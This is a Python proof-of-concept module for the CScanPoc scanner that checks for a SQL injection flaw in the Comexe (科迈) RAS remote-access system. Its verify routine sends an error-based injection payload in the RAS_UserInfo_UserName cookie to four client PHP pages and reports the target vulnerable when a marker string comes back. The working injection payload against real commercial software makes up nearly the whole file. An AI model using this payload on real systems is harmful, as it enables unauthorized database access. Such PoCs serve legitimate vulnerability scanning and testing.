# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'comexe_0001' # 平台漏洞编号，留空
    name = '科迈RAS系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = ''  # 漏洞公布时间
    desc = '''
        科迈RAS系统，函数过滤不全导致SQL注射。
    '''  # 漏洞描述
    ref = ''  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = ''  # cve编号
    product = '科迈'  # 漏洞应用名称
    product_version = '科迈RAS系统'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'a7bc8bbd-bd0d-406d-a9c0-66ee8bfb165c'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-10'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            hh = hackhttp.hackhttp()
            payloads = [
                "/Client/CmxHome.php cookie",
                "/Client/CmxAbout.php",
                "/Client/CmxChangePass.php",
                "/Client/CmxDownload.php"
            ]
            for payload in payloads:
                target = self.target + payload
                code, head, body, errcode, final_url = hh.http(target, cookie="RAS_UserInfo_UserName=-4758' OR 1 GROUP BY CONCAT(0x71786a6271,(SELECT (CASE WHEN (5786=5786) THEN 1 ELSE 0 END)),0x71707a7171,FLOOR(RAND(0)*2)) HAVING MIN(0)#")
                if code == 200 and 'qxjbq1qpzqq1' in body:
                    #security_hole(target)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
